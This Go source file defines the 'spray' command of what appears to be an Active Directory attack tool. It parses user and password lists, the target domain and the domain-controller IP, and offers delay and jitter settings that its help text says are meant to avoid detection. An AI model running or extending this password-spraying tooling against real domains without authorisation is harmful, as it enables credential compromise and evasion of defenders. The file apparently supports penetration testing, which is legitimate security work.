// cmd/adgo/commands/spray.go
package commands

import (
	"fmt"

	"adgo/pkg/spray"

	"github.com/spf13/cobra"
)

// SprayCmd commande de password spraying
var SprayCmd = &cobra.Command{
	Use:   "spray",
	Short: "Password spraying attacks with anti-lockout protection",
	Long: `Perform intelligent password spraying attacks against domain accounts.

Features:
- Automatic lockout policy detection
- Intelligent delay calculation
- Jitter to avoid detection
- Safe-by-default (sprays by password, not by user)

Example:
  adgo spray --users users.txt --passwords passwords.txt -d lab.local --dc-ip 192.168.1.10`,
	RunE: runPasswordSpray,
}

func init() {
	SprayCmd.Flags().String("users", "", "File containing usernames (required)")
	SprayCmd.Flags().String("passwords", "", "File containing passwords (required)")
	SprayCmd.Flags().String("domain", "", "Target domain (required)")
	SprayCmd.Flags().String("dc-ip", "", "Domain Controller IP (required)")
	SprayCmd.Flags().Int("delay", 30, "Delay between attempts (seconds)")
	SprayCmd.Flags().Int("jitter", 20, "Random jitter percentage (0-50)")
	SprayCmd.Flags().Int("threads", 1, "Number of parallel threads")
	SprayCmd.Flags().Bool("verbose", false, "Verbose output (show all attempts)")
	SprayCmd.Flags().Bool("no-lockout-check", false, "Skip lockout policy check")
	SprayCmd.Flags().Bool("stop-on-success", false, "Stop after first valid credential")

	SprayCmd.MarkFlagRequired("users")
	SprayCmd.MarkFlagRequired("passwords")
	SprayCmd.MarkFlagRequired("domain")
	SprayCmd.MarkFlagRequired("dc-ip")
}

func runPasswordSpray(cmd *cobra.Command, args []string) error {
	usersFile, _ := cmd.Flags().GetString("users")
	passwordsFile, _ := cmd.Flags().GetString("passwords")
	domain, _ := cmd.Flags().GetString("domain")
	dcIP, _ := cmd.Flags().GetString("dc-ip")
	delay, _ := cmd.Flags().GetInt("delay")
	jitter, _ := cmd.Flags().GetInt("jitter")
	threads, _ := cmd.Flags().GetInt("threads")
	verbose, _ := cmd.Flags().GetBool("verbose")
	noLockoutCheck, _ := cmd.Flags().GetBool("no-lockout-check")
	stopOnSuccess, _ := cmd.Flags().GetBool("stop-on-success")

	cfg := &spray.SprayConfig{
		UsersFile:     usersFile,
		PasswordsFile: passwordsFile,
		Domain:        domain,
		DCIP:          dcIP,
		Delay:         delay,
		Jitter:        jitter,
		Threads:       threads,
		Verbose:       verbose,
		LockoutCheck:  !noLockoutCheck,
		StopOnSuccess: stopOnSuccess,
	}

	fmt.Println("\n=== Password Spraying Attack ===")
	fmt.Printf("Target: %s (%s)\n", domain, dcIP)
	fmt.Printf("Users: %s\n", usersFile)
	fmt.Printf("Passwords: %s\n", passwordsFile)
	fmt.Printf("Delay: %d seconds (±%d%% jitter)\n\n", delay, jitter)

	summary, err := spray.PasswordSpray(cfg)
	if err != nil {
		return fmt.Errorf("spray failed: %v", err)
	}

	spray.PrintSummary(summary)

	return nil
}
